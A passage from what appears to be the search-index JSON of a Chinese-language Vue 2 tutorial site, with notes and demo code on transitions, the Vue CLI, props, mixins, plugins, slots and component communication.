元素冲突\",\"实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用\",\"一个组件在用：放在组件自身即可\",\"一些组件在用：放在他们共同的父组件上（状态提升）\",\"实现交互：从绑定事件开始\"]}]},\"/front-end/vue-notes/15-Vue%E6%A0%B8%E5%BF%83-%E8%BF%87%E6%B8%A1%E4%B8%8E%E5%8A%A8%E7%94%BB.html\":{\"title\":\"过渡与动画\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/15-Vue核心-过渡与动画\"]},{\"header\":\"1. Vue动画的理解\",\"slug\":\"_1-vue动画的理解\",\"contents\":[\"操作 CSS 的 transition 或 animation\",\"Vue 会给目标元素添加/移除特定的 class\"]},{\"header\":\"2. 基本过渡动画的编码\",\"slug\":\"_2-基本过渡动画的编码\",\"contents\":[\"在目标元素外包裹 <transition name=\\\"xxx\\\">\",\"定义 class 样式 \",\"指定过渡样式：transition\",\"指定隐藏时的样式：opacity/其它\"]},{\"header\":\"3. 过渡的类名\",\"slug\":\"_3-过渡的类名\",\"contents\":[\"xxx-enter-active：指定显示的 transition\",\"xxx-leave-active：指定隐藏的 transition\",\"xxx-enter：指定隐藏时的样式\",\"Vue核心-过渡与动画01.png\"]},{\"header\":\"4. 过渡代码演示\",\"slug\":\"_4-过渡代码演示\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>过渡</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> /* 显示/隐藏的过渡效果 */ .xxx-enter-active, .xxx-leave-active { transition: opacity 0.5s; } /* 隐藏时的样式 */ .xxx-enter, .xxx-leave-to { opacity: 0; } .move-enter-active { transition: all 1s; } .move-leave-active { transition: all 3s; } .move-enter, .move-leave-to { opacity: 0; transition: translateX(20px); } </style> </head> <body> <div id=\\\"demo1\\\"> <button @click=\\\"isShow=!isShow\\\">过渡1</button> <transition name=\\\"xxx\\\"> <p v-show=\\\"isShow\\\">学前端</p> </transition> </div> <div id=\\\"demo2\\\"> <button @click=\\\"isShow=!isShow\\\">过渡2</button> <transition name=\\\"move\\\"> <p v-show=\\\"isShow\\\">天天学前端</p> </transition> </div> <script> new Vue({ el: '#demo1', data() { return { isShow: true, } }, }) new Vue({ el: '#demo2', data: { isShow: true, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-过渡与动画02.gif\"]},{\"header\":\"5. 动画代码演示\",\"slug\":\"_5-动画代码演示\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>动画</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> .bounce-enter-active { animation: bounce-in 0.5s; } .bounce-leave-active { animation: bounce-in 0.5s reverse; } @keyframes bounce-in { 0% { transform: scale(0); } 50% { transform: scale(1.5); } 100% { transform: scale(1); } } </style> </head> <body> <div id=\\\"example-2\\\"> <button @click=\\\"show = !show\\\">Toggle show</button><br /> <transition name=\\\"bounce\\\"> <p v-if=\\\"show\\\" style=\\\"display: inline-block\\\">一直在学前端</p> </transition> </div> <script> new Vue({ el: '#example-2', data: { show: true, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-过渡与动画03.gif\"]},{\"header\":\"6. 使用第三方动画库\",\"slug\":\"_6-使用第三方动画库\",\"contents\":[\"第三方动画库 Animate.css\",\"安装第三方库： npm i animate.css\",\"使用：直接引用就可以 import 'animate.css'\",\"代码演示：\",\"<template> <div> <button @click=\\\"isShow = !isShow\\\">显示/隐藏</button> <transition-group appear name=\\\"animate__animated animate__bounce\\\" enter-active-class=\\\"animate__swing\\\" leave-active-class=\\\"animate__backOutUp\\\" > <h1 v-show=\\\"!isShow\\\" key=\\\"1\\\">你好啊！</h1> <h1 v-show=\\\"isShow\\\" key=\\\"2\\\">哈哈哈！</h1> </transition-group> </div> </template> <script> import 'animate.css' export default { name:'Test', data() { return { isShow:true } }, } </script> <style scoped> h1{ background-color: orange; } </style> \"]},{\"header\":\"7. 总结\",\"slug\":\"_7-总结\",\"contents\":[\"作用：在插入、更新或移除 DOM 元素时，在合适的时候给元素添加样式类名\",\"写法：\",\"准备好样式 \",\"元素进入的样式 \",\"v-enter 进入的起点\",\"v-enter-active 进入过程中\",\"v-enter-to 进入的终点\",\"元素离开的样式 \",\"v-leave 离开的起点\",\"v-leave-active 离开过程中\",\"v-leave-to 离开的终点\",\"使用 <transition> 包裹要过度的元素，并配置 name 属性，此时需要将上面样式名的 v 换为 name 的值\",\"要让页面一开始就显示动画，需要添加 appear\",\"备注：若有多个元素需要过度，则需要使用 <transition-group>，且每个元素都要指定 key 值\",\"<transition-group name=\\\"hello\\\" appear> <h1 v-show=\\\"!isShow\\\" key=\\\"1\\\">你好啊！</h1> <h1 v-show=\\\"isShow\\\" key=\\\"2\\\">哈哈哈！</h1> </transition-group> \"]}]},\"/front-end/vue-notes/16-VueCLI%E8%84%9A%E6%89%8B%E6%9E%B6.html\":{\"title\":\"VueCLI脚手架\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/16-VueCLI脚手架\"]},{\"header\":\"1. 说明\",\"slug\":\"_1-说明\",\"contents\":[\"Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）\",\"文档 Vue CLI\"]},{\"header\":\"2. 具体步骤\",\"slug\":\"_2-具体步骤\",\"contents\":[\"如果下载缓慢请配置 npm 淘宝镜像\",\"npm config set registry http://registry.npm.taobao.org \",\"全局安装 @vue/cli\",\"npm install -g @vue/cli \",\"切换到创建项目的目录，使用命令创建项目\",\"vue create xxx \",\"选择使用 vue 的版本\",\"启动项目\",\"npm run serve \",\"打包项目\",\"npm run build \",\"暂停项目 Ctrl+C\",\"注意：Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpack 配置，请执行vue inspect > output.js\"]},{\"header\":\"3. 脚手架文件结构\",\"slug\":\"_3-脚手架文件结构\",\"contents\":[\".文件目录 ├── node_modules ├── public │ ├── favicon.ico: 页签图标 │ └── index.html: 主页面 ├── src │ ├── assets: 存放静态资源 │ │ └── logo.png │ │── component: 存放组件 │ │ └── HelloWorld.vue │ │── App.vue: 汇总所有组件 │ └── main.js: 入口文件 ├── .gitignore: git版本管制忽略的配置 ├── babel.config.js: babel的配置文件 ├── package.json: 应用包配置文件 ├── README.md: 应用描述文件 └── package-lock.json: 包版本控制文件 \",\"src/components/School.vue\",\"<template> <div class=\\\"demo\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> <button @click=\\\"showName\\\">点我提示学校名</button> </div> </template> <script> export default { name: \\\"School\\\", data() { return { name: \\\"QFNU\\\", address: \\\"曲阜\\\", } }, methods: { showName() { alert(this.name) } } } </script> <style> .demo { background-color: orange; } </style> \",\"src/components/Student.vue\",\"<template> <div> <h2>学生姓名：{{ name }}</h2> <h2>学生年龄：{{ age }}</h2> </div> </template> <script> export default { name: \\\"Student\\\", data() { return { name: \\\"zhf\\\", age: 18, } } } </script> \",\"src/App.vue\",\"<template> <div> <School></School> <Student></Student> </div> </template> <script> //引入组件 import School from './components/School.vue' import Student from './components/Student.vue' export default { name: 'App', components: { School, Student } } </script> \",\"src/main.js\",\"// 该文件是整个项目的入口文件 import Vue from 'vue' // 引入Vue import App from './App.vue' // 引入App组件，它是所有组件的父组件 Vue.config.productionTip = false new Vue({ el:'#app', render: h => h(App), // render函数完成了这个功能：将App组件放入容器中 })// .$mount('#app') \",\"public/index.html\",\"<!DOCTYPE html> <html lang=\\\"\\\"> <head> <meta charset=\\\"UTF-8\\\"> <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 --> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <!-- 开启移动端的理想端口 --> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <!-- 配置页签图标 <%= BASE_URL %> 是public所在路径，使用绝对路径 --> <link rel=\\\"icon\\\" href=\\\" <%= BASE_URL %> favicon.ico\\\"> <!-- 配置网页标题 --> <title> <%= htmlWebpackPlugin. options. title %> </title> </head> <body> <!-- 当浏览器不支持js时，noscript中的元素就会被渲染 --> <noscript> <strong>We're sorry but <%= htmlWebpackPlugin. options. title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong> </noscript> <!-- 容器 --> <div id=\\\"app\\\"></div> </body> </html> \",\"效果：\",\"VueCLI脚手架01.gif\"]},{\"header\":\"4. render函数\",\"slug\":\"_4-render函数\",\"contents\":[\"render 是一个函数，应用于残缺版 vue, 能够接收参数 createElement (类型是一个函数)，借助它来渲染内容\",\"render(createElement){ //createElement创建标签<h1>你好啊</h1> return createElement('h1','你好啊') } \",\"简写为：\",\"render p=>p('h1','你好啊') // 如果只有模板的话可直接写为如下格式 render p=>p(App) //App是以一个模板的名称 \",\"import Vue from 'vue' import App from './App.vue' Vue.config.productionTip = false new Vue({ el:'#app', // render函数功能：将App组件放入容器中 // 简写形式 render: h => h(App), // 完整形式 // render(createElement){ // return createElement(App) // } }) \"]},{\"header\":\"5. 关于不同版本的函数\",\"slug\":\"_5-关于不同版本的函数\",\"contents\":[\"vue.js 与 vue.runtime.xxx.js 的区别 \",\"vue.js 是完整版的 Vue，包含：核心功能+模板解析器\",\"vue.runtime.xxx.js 是运行版的 Vue，只包含核心功能，没有模板解析器\",\"因为 vue.runtime.xxx.js 没有模板解析器，所以不能使用 template 配置项，需要使用 render 函数接收到的 createElement 函数去指定具体内容\"]},{\"header\":\"6. vue.config.js配置文件\",\"slug\":\"_6-vue-config-js配置文件\",\"contents\":[\"vue inspect > output.js命令可以查看到 Vue 脚手架的默认配置\",\"使用 vue.config.js 可以对脚手架进行个性化定制，和 package.json 同级目录，详见 配置参考 | Vue CLI\",\"module.exports = { pages: { index: { entry: 'src/main.js' // 入口 } }, lintOnSave: false // 关闭语法检查 } \"]}]},\"/front-end/vue-notes/17-Vue%E6%A0%B8%E5%BF%83-%E5%85%B6%E5%AE%83%E5%B0%8F%E7%9F%A5%E8%AF%86.html\":{\"title\":\"其它小知识\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/17-Vue核心-其它小知识\"]},{\"header\":\"1. ref属性\",\"slug\":\"_1-ref属性\",\"contents\":[\"ref 被用来给元素或子组件注册引用信息（id 的替代者）\",\"应用在 html 标签上获取的是真实 DOM 元素，应用在组件标签上获取的是组件实例对象 vc\",\"使用方式 \",\"打标识：<h1 ref=\\\"xxx\\\"></h1> 或 <School ref=\\\"xxx\\\"></School>\",\"获取：this.$refs.xxx\",\"例：\",\"src/App.vue\",\"<template> <div> <h1 v-text=\\\"msg\\\" ref=\\\"title\\\"></h1> <button ref=\\\"btn\\\" @click=\\\"showDOM\\\">点我输出上方的DOM元素</button> <School ref=\\\"sch\\\"></School> </div> </template> <script> import School from './components/School.vue' export default { name: 'App', components: { School }, data() { return { msg: '欢迎学习Vue!' } }, methods: { showDOM() { console.log(this.$refs.title)// 真实DOM元素 console.log(this.$refs.btn)//真实DOM元素 console.log(this.$refs.sch)//School组件的实例对象（vc） } } } </script> \",\"src/components/School.vue\",\"<template> <div class=\\\"demo\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> <button @click=\\\"showName\\\">点我提示学校名</button> </div> </template> <script> export default { name: \\\"School\\\", data() { return { name: \\\"QFNU\\\", address: \\\"曲阜\\\", } }, methods: { showName() { alert(this.name) } } } </script> <style> .demo { background-color: orange; } </style> \",\"效果：\",\"Vue核心-其它小知识01.gif\"]},{\"header\":\"2. props配置项\",\"slug\":\"_2-props配置项\",\"contents\":[\"功能：props 让组件接收外部传过来的数据\",\"props 适用于：\",\"父组件 ==> 子组件 通信\",\"子组件 ==> 父组件 通信（要求父组件先给子组件一个函数）\"]},{\"header\":\"2.1 传递数据\",\"slug\":\"_2-1-传递数据\",\"contents\":[\"<Demo name=\\\"xxx\\\" :age=\\\"18\\\"/> 这里 age 前加 :，通过 v-bind 使得里面的 18 是数字，否则 Vue 会认为是字符串，即只有传递字符串时不加 :\"]},{\"header\":\"2.2 接收数据\",\"slug\":\"_2-2-接收数据\",\"contents\":[\"第一种方式（只接收）\",\"props:['name','age'] \",\"第二种方式（限制类型）\",\"props:{name:String, age:Number} \",\"第三种方式（限制类型、限制必要性、指定默认值）\",\"props: { name: { type: String, // 类型 required: true,// 必要性 default: 'cess'// 默认值 } } \",\"备注：props 是只读的，Vue 底层会监测你对 props 的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制 props 的内容到 data 中，然后去修改 data 中的数据\",\"例：\",\"src/App.vue\",\"<template> <div> <Student name=\\\"李四\\\" sex=\\\"女\\\" :age=\\\"18\\\"></Student> <Student name=\\\"王五\\\" sex=\\\"男\\\" :age=\\\"20\\\"></Student> </div> </template> <script> import Student from './components/Student.vue' export default { name: 'App', components: { Student } } </script> \",\"src/components/Student.vue\",\"<template> <div> <h1>{{ msg }}</h1> <h2>学生姓名：{{ name }}</h2> <h2>学生性别：{{ sex }}</h2> <h2>学生年龄：{{ myAge + 1 }}</h2> <button @click=\\\"updateAge\\\">尝试修改收到的年龄</button> </div> </template> <script> export default { name: 'Student', data() { return { msg: \\\"我是QFNU的学生\\\", myAge: this.age, } }, methods: { updateAge() { this.myAge++ } }, // 简单声明接收 //props: ['name', 'age', 'sex'] //接收的同时对数据进行类型限制 // props: { // name: String, // age: Number, // sex: String, // } // 接收的同时对数据：进行类型限制+默认值的指定+必要性的限制 props: { name: { type: String, //name的类型是字符串 required: true, //name是必要的 }, age: { type: Number, default: 99, //默认值 }, sex: { type: String, required: true, }, }, } </script> \",\"效果：\",\"Vue核心-其它小知识02.gif\"]},{\"header\":\"3. mixin混入\",\"slug\":\"_3-mixin混入\",\"contents\":[\"功能：可以把多个组件共用的配置提取成一个混入对象\",\"使用方式：\",\"先定义混入\",\"const mixin = { data() {....}, methods: {....} .... } \",\"再使用混入\",\"全局混入 Vue.mixin(xxx)\",\"局部混入 mixins:['xxx']\",\"备注：组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时以组件优先\",\"var mixin = { data: function () { return { message: 'hello', foo: 'abc' } } } new Vue({ mixins: [mixin], data () { return { message: 'goodbye', bar: 'def' } }, created () { console.log(this.$data) // => { message: \\\"goodbye\\\", foo: \\\"abc\\\", bar: \\\"def\\\" } } }) \",\"同名生命周期钩子将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用\",\"var mixin = { created () { console.log('混入对象的钩子被调用') } } new Vue({ mixins: [mixin], created () { console.log('组件钩子被调用') } }) // => \\\"混入对象的钩子被调用\\\" // => \\\"组件钩子被调用\\\" \",\"例：\",\"src/mixin.js\",\"export const hunhe = { methods: { showName() { alert(this.name) }, }, mounted() { console.log('你好啊！') }, } export const hunhe2 = { data() { return { x: 100, y: 200, } }, } \",\"src/components/School.vue\",\"<template> <div> <h2 @click=\\\"showName\\\">学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> </div> </template> <script> //引入一个hunhe、hunhe2 import { hunhe, hunhe2 } from '../mixin' export default { name: 'School', data() { return { name: 'QFNU', address: '山东', x: 666 } }, mixins: [hunhe, hunhe2] // 局部混入 } </script> \",\"src/components/Student.vue\",\"<template> <div> <h2 @click=\\\"showName\\\">学生姓名：{{ name }}</h2> <h2>学生性别：{{ sex }}</h2> </div> </template> <script> import { hunhe, hunhe2 } from '../mixin' export default { name: 'Student', data() { return { name: '张三', sex: '男' } }, mixins: [hunhe, hunhe2] // 局部混入 } </script> \",\"src/App.vue\",\"<template> <div> <School></School> <hr> <Student></Student> </div> </template> <script> import School from './components/School.vue' import Student from './components/Student.vue' export default { name: 'App', components: { School, Student } } </script> \",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' // import {mixin} from './mixin' Vue.config.productionTip = false // Vue.mixin(hunhe) // 全局混合引入 // Vue.mixin(hunhe2) // 全局混合引入 new Vue({ render: (h) => h(App), }).$mount('#app') \",\"效果：\",\"Vue核心-其它小知识03.gif\"]},{\"header\":\"4. plugin插件\",\"slug\":\"_4-plugin插件\",\"contents\":[\"功能：用于增强 Vue\",\"本质：包含 install 方法的一个对象，install 的第一个参数是 Vue，第二个以后的参数是插件使用者传递的数据\",\"定义插件（见下 src/plugin.js）\",\"使用插件：Vue.use()\",\"例：\",\"src/plugins.js\",\"export default { install(Vue, x, y, z) { console.log(x, y, z) //全局过滤器 Vue.filter('mySlice', function (value) { return value.slice(0, 4) }) //定义全局指令 Vue.directive('fbind', { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, }) //定义混入 Vue.mixin({ data() { return { x: 100, y: 200 } }, }) //给Vue原型上添加一个方法（vm和vc就都能用了） Vue.prototype.hello = () => { alert('你好啊') } }, } \",\"src/main.js\",\"import Vue from 'vue' import App from './App.vue' import plugins from './plugins' // 引入插件 Vue.config.productionTip = false Vue.use(plugins,1,2,3) // 应用（使用）插件 new Vue({ el:'#app', render: h => h(App) }) \",\"src/components/School.vue\",\"<template> <div> <h2>学校名称：{{ name | mySlice }}</h2> <h2>学校地址：{{ address }}</h2> <button @click=\\\"test\\\">点我测试一个hello方法</button> </div> </template> <script> export default { name: 'School', data() { return { name: '曲阜师范大学QFNU', address: '山东', } }, methods: { test() { this.hello() } }, } </script> \",\"src/components/Student.vue\",\"<template> <div> <h2>学生姓名：{{ name }}</h2> <h2>学生性别：{{ sex }}</h2> <input type=\\\"text\\\" v-fbind:value=\\\"name\\\"> </div> </template> <script> export default { name:'Student', data() { return { name:'张三', sex:'男' } }, } </script> \",\"src/App.vue\",\"<template> <div> <School></School> <Student></Student> </div> </template> <script> import School from './components/School.vue' import Student from './components/Student.vue' export default { name: 'App', components: { School, Student } } </script> \",\"效果：\",\"Vue核心-其它小知识04.gif\"]},{\"header\":\"5. scoped样式\",\"slug\":\"_5-scoped样式\",\"contents\":[\"作用：让样式在局部生效，防止冲突\",\"写法：<style scoped>\"]},{\"header\":\"6. $nextTick\",\"slug\":\"_6-nexttick\",\"contents\":[\"这是一个生命周期钩子\",\"语法：this.$nextTick(回调函数)\",\"作用：在下一次 DOM 更新结束后执行其指定的回调\",\"什么时候用：当改变数据后，要基于更新后的新 DOM 进行某些操作时，要在 $nextTick 所指定的回调函数中执行\",\"比如：点击编辑按钮使文本变成表单且自动获取焦点\",\"点击表单时会用一个布尔值配合v-show使表单显示，可是改变布尔值的时候，后面的focus方法会跟着执行，然后再渲染模板\",\"例：\",\"src/App.vue\",\"<template> <div> <Test></Test> </div> </template> <script> import Test from './components/Test.vue' export default { name: 'App', components: { Test } } </script> \",\"src/components/Test.vue\",\"<template> <div> <label> <span v-show=\\\"!showInput\\\">{{ msg }}</span> <input type=\\\"text\\\" v-show=\\\"showInput\\\" :value=\\\"msg\\\" ref=\\\"editMsg\\\" @blur=\\\"handleBlur($event)\\\"> </label> <br> <br> <button @click=\\\"edit\\\">编辑</button> </div> </template> <script> export default { name: 'Test', data() { return { showInput: false, msg: '你好', } }, methods: { edit() { this.showInput = true this.$nextTick(function () { this.$refs.editMsg.focus() }) }, handleBlur(e) { this.showInput = false this.msg = e.target.value console.log(e.target.value) } } } </script> \",\"效果：\",\"Vue核心-其它小知识05.gif\"]}]},\"/front-end/vue-notes/18-Vue%E6%A0%B8%E5%BF%83-slot%E6%8F%92%E6%A7%BD.html\":{\"title\":\"slot插槽\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/18-Vue核心-slot插槽\",\"什么是插槽：子组件提供给父组件的占位符，用slot元素来表示，父组件可以在这个占位符里面填充各种模板代码（HTML结构、组件等），简而言之，就是子组件留个坑，父组件可以使用指定的内容来填坑\",\"分类：默认插槽、具名插槽、作用域插槽\"]},{\"header\":\"1. 默认插槽\",\"slug\":\"_1-默认插槽\",\"contents\":[\"父组件中：\",\"<Category> <!--我将用下面的内容来填坑--> <div>html结构1</div> </Category> \",\"子组件中：\",\"<template> <div> <!-- 定义插槽，我是一个坑 --> <slot>插槽默认内容...</slot> </div> </template> \",\"案例：\",\"src/App.vue\",\"<template> <div class=\\\"container\\\"> <Category title=\\\"美食\\\"> <img src=\\\"https://th.bing.com/th/id/R.61124cb94372f970f23008fcfbf7373a?rik=evdzDUm5XRN1kw&riu=http%3a%2f%2f5b0988e595225.cdn.sohucs.com%2fimages%2f20190714%2fd9047f685b61469e942ba1a1588f71e6.jpeg&ehk=i%2bBUrdSzG3ZPjDf%2bA3YLsz5oAW9x2a%2b6uV%2bFpUZRnFs%3d&risl=&pid=ImgRaw&r=0\\\" alt=\\\"\\\"> </Category> <Category title=\\\"游戏\\\"> <ul> <li v-for=\\\"(g, index) in games\\\" :key=\\\"index\\\">{{ g }}</li> </ul> </Category> <Category title=\\\"电影\\\"> <video controls src=\\\"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4\\\"></video> </Category> </div> </template> <script> import Category from './components/Category' export default { name: 'App', components: { Category }, data() { return { foods: ['火锅', '烧烤', '小龙虾', '牛排'], games: ['红色警戒', '穿越火线', '劲舞团', '超级玛丽'], films: ['《教父》', '《拆弹专家》', '《你好，李焕英》', '《哈哈哈》'] } }, } </script> <style scoped> .container { display: flex; justify-content: space-around; } </style> \",\"src/components/Category.vue\",\"<template> <div class=\\\"category\\\"> <h3>{{ title }}分类</h3> <!--定义一个插槽 （挖个坑，等着组件的使用者进行填充）--> <slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot> </div> </template> <script> export default { name: 'Category', props: ['title'] } </script> <style scoped> .category { background-color: skyblue; width: 200px; height: 300px; } h3 { text-align: center; background-color: orange; } video { width: 100%; } img { width: 100%; } </style> \",\"效果：\",\"Vue核心-slot插槽01.png\"]},{\"header\":\"2. 具名插槽\",\"slug\":\"_2-具名插槽\",\"contents\":[\"父组件指明放入子组件的哪个插槽 slot=\\\"footer\\\"\",\"还可以在一个 <template> 元素上使用 v-slot:footer 指令，并以 slot 的参数的形式提供其名称（可以简写为：#footer）\",\"父组件中：\",\"<Category> <template slot=\\\"center\\\"> <div>html结构1</div> </template> <template v-slot:footer> <!-- <template #footer> --> <div>html结构2</div> </template> </Category> \",\"子组件中：\",\"<template> <div> <!-- 定义插槽,使用name来定义 --> <slot name=\\\"center\\\">插槽默认内容...</slot> <slot name=\\\"footer\\\">插槽默认内容...</slot> </div> </template> \",\"例：\",\"src/App.vue\",\"<template> <div class=\\\"container\\\"> <Category title=\\\"美食\\\"> <img slot=\\\"center\\\" src=\\\"https://th.bing.com/th/id/R.61124cb94372f970f23008fcfbf7373a?rik=evdzDUm5XRN1kw&riu=http%3a%2f%2f5b0988e595225.cdn.sohucs.com%2fimages%2f20190714%2fd9047f685b61469e942ba1a1588f71e6.jpeg&ehk=i%2bBUrdSzG3ZPjDf%2bA3YLsz5oAW9x2a%2b6uV%2bFpUZRnFs%3d&risl=&pid=ImgRaw&r=0\\\" alt=\\\"\\\"> <a slot=\\\"footer\\\" href=\\\"http://www.atguigu.com\\\">更多美食</a> </Category> <Category title=\\\"游戏\\\"> <ul slot=\\\"center\\\"> <li v-for=\\\"(g, index) in games\\\" :key=\\\"index\\\">{{ g }}</li> </ul> <div class=\\\"foot\\\" slot=\\\"footer\\\"> <a href=\\\"http://www.atguigu.com\\\">单机游戏</a> <a href=\\\"http://www.atguigu.com\\\">网络游戏</a> </div> </Category> <Category title=\\\"电影\\\"> <video slot=\\\"center\\\" controls src=\\\"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4\\\"></video> <template v-slot:footer> <div class=\\\"foot\\\"> <a href=\\\"http://www.atguigu.com\\\">经典</a> <a href=\\\"http://www.atguigu.com\\\">热门</a> <a href=\\\"http://www.atguigu.com\\\">推荐</a> </div> <h4>欢迎前来观影</h4> </template> </Category> </div> </template> <script> import Category from './components/Category.vue' export default { name: 'App', components: { Category }, data() { return { foods: ['火锅', '烧烤', '小龙虾', '牛排'], games: ['红色警戒', '穿越火线', '劲舞团', '超级玛丽'], films: ['《教父》', '《拆弹专家》', '《你好，李焕英》', '《哈哈哈》'] } }, } </script> <style scoped> .container, .foot { display: flex; justify-content: space-around; } h4 { text-align: center; } </style> \",\"src/components/Category.vue\",\"<template> <div class=\\\"category\\\"> <h3>{{ title }}分类</h3> <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） --> <slot name=\\\"center\\\">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot> <slot name=\\\"footer\\\">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot> </div> </template> <script> export default { name: 'Category', props: ['title'] } </script> <style scoped> .category { background-color: skyblue; width: 200px; height: 300px; } h3 { text-align: center; background-color: orange; } video { width: 100%; } img { width: 100%; } </style> \",\"效果：\",\"Vue核心-slot插槽02.png\"]},{\"header\":\"3. 作用域插槽\",\"slug\":\"_3-作用域插槽\",\"contents\":[\"作用：能够传递数据，父组件可以接收子组件传递的参数\",\"理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定\",\"如：games 数据在 Category 组件中，但使用数据所遍历出来的结构由 App 组件决定\",\"父组件中：\",\"<Category> <template scope=\\\"scopeData\\\"> <!-- 生成的是ul列表 --> <ul> <li v-for=\\\"g in scopeData.games\\\" :key=\\\"g\\\">{{g}}</li> </ul> </template> </Category> <Category> <template slot-scope=\\\"scopeData\\\"> <!-- 生成的是h4标题 --> <h4 v-for=\\\"g in scopeData.games\\\" :key=\\\"g\\\">{{g}}</h4> </template> </Category> <Category> <template v-slot=\\\"scopeData\\\"> <!-- 生成的是h4标题 --> <h4 v-for=\\\"g in scopeData.games\\\" :key=\\\"g\\\">{{g}}</h4> </template> </Category> \",\"slot 和 slot-scope目前已被v-slot指令代替\",\"子组件中：\",\"<template> <div> <slot :games=\\\"games\\\"></slot> </div> </template> <script> export default { name:'Category', props:['title'], //数据在子组件自身 data() { return { games:['红色警戒','穿越火线','劲舞团','超级玛丽'] } }, } </script> \",\"注意：关于样式，既可以写在父组件中，解析后放入子组件插槽；也可以放在子组件中，传给子组件再解析\",\"例：\",\"src/App.vue\",\"<template> <div class=\\\"container\\\"> <Category title=\\\"游戏\\\"> <template scope=\\\"zhf\\\"> <ul> <li v-for=\\\"(g, index) in zhf.games\\\" :key=\\\"index\\\">{{ g }}</li> </ul> </template> </Category> <Category title=\\\"游戏\\\"> <template scope=\\\"{games}\\\"> <ol> <li style=\\\"color:red\\\" v-for=\\\"(g, index) in games\\\" :key=\\\"index\\\">{{ g }}</li> </ol> </template> </Category> <Category title=\\\"游戏\\\"> <template v-slot=\\\"{games}\\\"> <h4 v-for=\\\"(g, index) in games\\\" :key=\\\"index\\\">{{ g }}</h4> </template> </Category> </div> </template> <script> import Category from './components/Category.vue' export default { name: 'App', components: { Category } } </script> <style scoped> .container, .foot { display: flex; justify-content: space-around; } h4 { text-align: center; } </style> \",\"src/components/Category.vue\",\"<template> <div class=\\\"category\\\"> <h3>{{ title }}分类</h3> <slot :games=\\\"games\\\" msg=\\\"hello\\\">我是默认的一些内容</slot> </div> </template> <script> export default { name: 'HelloWorld', props: ['title'], data() { return { games: ['红色警戒', '穿越火线', '劲舞团', '超级玛丽'], } }, } </script> <style scoped> .category { background-color: skyblue; width: 200px; height: 300px; } h3 { text-align: center; background-color: orange; } video { width: 100%; } img { width: 100%; } </style> \",\"效果：\",\"Vue核心-slot插槽03.png\"]}]},\"/front-end/vue-notes/19-Vue%E6%A0%B8%E5%BF%83-%E7%BB%84%E4%BB%B6%E9%97%B4%E9%80%9A%E4%BF%A1.html\":{\"title\":\"组件间通信\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/19-Vue核心-组件间通信\"]},{\"header\":\"1. 简介\",\"slug\":\"_1-简介\",\"contents\":[]},{\"header\":\"1.1 组件间通信基本原则\",\"slug\":\"_1-1-组件间通信基本原则\",\"contents\":[\"不要在子组件中直接修改父组件的状态数据\",\"数据在哪, 更新数据的行为 (函数)就应该定义在哪\"]},{\"header\":\"1.2 Vue 组件间通信方式\",\"slug\":\"_1-2-vue-组件间通信方式\",\"contents\":[\"props\",\"vue 的自定义事件\",\"消息订阅与发布(如: pubsub 库)\",\"slot\",\"vuex\"]},{\"header\":\"2. props\",\"slug\":\"_2-props\",\"contents\":[\"详见：其它小知识——props配置项部分\"]},{\"header\":\"2.1 使用组件标签时\",\"slug\":\"_2-1-使用组件标签时\",\"contents\":[\"<my-component name='tom' :age='3' :set-name='setName'></my-component> \"]},{\"header\":\"2.2 定义组件时\",\"slug\":\"_2-2-定义组件时\",\"contents\":[\"在组件内声明所有的 props\",\"方式一: 只指定名称\",\"props: ['name', 'age', 'setName'] \",\"方式二: 指定名称和类型\",\"props: { name: String, age: Number, setNmae: Function } \",\"方式三: 指定名称/类型/必要性/默认值\",\"props: { name: {type: String, required: true, default:xxx}, } \"]},{\"header\":\"2.3 